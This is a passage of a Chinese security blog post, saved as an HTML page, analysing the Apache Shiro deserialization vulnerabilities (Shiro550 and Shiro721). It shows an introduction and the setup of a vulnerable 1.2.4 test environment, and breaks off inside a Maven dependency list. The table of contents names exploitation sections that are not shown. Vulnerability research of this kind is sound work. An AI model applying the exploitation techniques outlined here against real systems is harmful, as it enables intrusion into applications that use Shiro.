@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dililearngent.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-1}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Shiro组件的相关利用及漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Shiro反序列化漏洞分析">
+<meta property="og:url" content="https://dililearngent.github.io/2023/05/02/Shiro-security/index.html">
+<meta property="og:site_name" content="DiliLearngent&#39;s Blog">
+<meta property="og:description" content="Shiro组件的相关利用及漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829144420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145049.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829171009.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202529.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202955.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829211026.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829212305.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829220941.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224210.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224409.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830160136.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830161101.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830163004.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830170202.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171114.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171558.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903142908.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154707.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904154417.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904155600.png">
+<meta property="article:published_time" content="2023-05-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-31T16:00:00.000Z">
+<meta property="article:author" content="DiliLearngent">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829144420.png">
+
+
+<link rel="canonical" href="https://dililearngent.github.io/2023/05/02/Shiro-security/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dililearngent.github.io/2023/05/02/Shiro-security/","path":"2023/05/02/Shiro-security/","title":"Java安全之Shiro反序列化漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Shiro反序列化漏洞分析 | DiliLearngent's Blog</title>
+  
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DiliLearngent's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人要終於年輕時候的夢想！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro550"><span class="nav-number">2.</span> <span class="nav-text">Shiro550</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#remeberMe%E7%9A%84%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">remeberMe的生成过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#remeberMe%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.2.</span> <span class="nav-text">remeberMe的解析过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro-URLDNS"><span class="nav-number">2.3.1.</span> <span class="nav-text">shiro+URLDNS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%BE%E7%82%B9"><span class="nav-number">2.4.</span> <span class="nav-text">难点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EresolveClass"><span class="nav-number">2.4.1.</span> <span class="nav-text">关于resolveClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8CC%E9%93%BE"><span class="nav-number">2.4.2.</span> <span class="nav-text">利用CC链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.6.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro721"><span class="nav-number">3.</span> <span class="nav-text">Shiro721</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-number">3.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90"><span class="nav-number">3.2.1.</span> <span class="nav-text">密钥生成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-Oracle-Attack%E6%94%BB%E5%87%BB"><span class="nav-number">3.2.2.</span> <span class="nav-text">Padding Oracle Attack攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="nav-number">3.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DiliLearngent"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">DiliLearngent</p>
+  <div class="site-description" itemprop="description">保持热爱!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DiliLearngent" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DiliLearngent" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#f00';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dililearngent.github.io/2023/05/02/Shiro-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="DiliLearngent">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiliLearngent's Blog">
+      <meta itemprop="description" content="保持热爱!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Shiro反序列化漏洞分析 | DiliLearngent's Blog">
+      <meta itemprop="description" content="Shiro组件的相关利用及漏洞分析">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Shiro反序列化漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-03 00:00:00" itemprop="dateCreated datePublished" datetime="2023-05-03T00:00:00+08:00">2023-05-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-01 00:00:00" itemprop="dateModified" datetime="2023-08-01T00:00:00+08:00">2023-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>20 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">Shiro组件的相关利用及漏洞分析</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方文档：<a target="_blank" rel="noopener" href="https://shiro.apache.org/">https://shiro.apache.org/</a></p>
+<blockquote>
+<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.</p>
+</blockquote>
+<p>Apache Shiro是Java中的一个安全框架，可以执行身份验证、授权、加密和会话管理。<br>关于漏洞：<a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">https://shiro.apache.org/security-reports.html</a></p>
+<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>地址：<a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>使用IDEA打开文件夹，修改samples中web目录下的pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;scope&gt;provided&lt;/scope&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 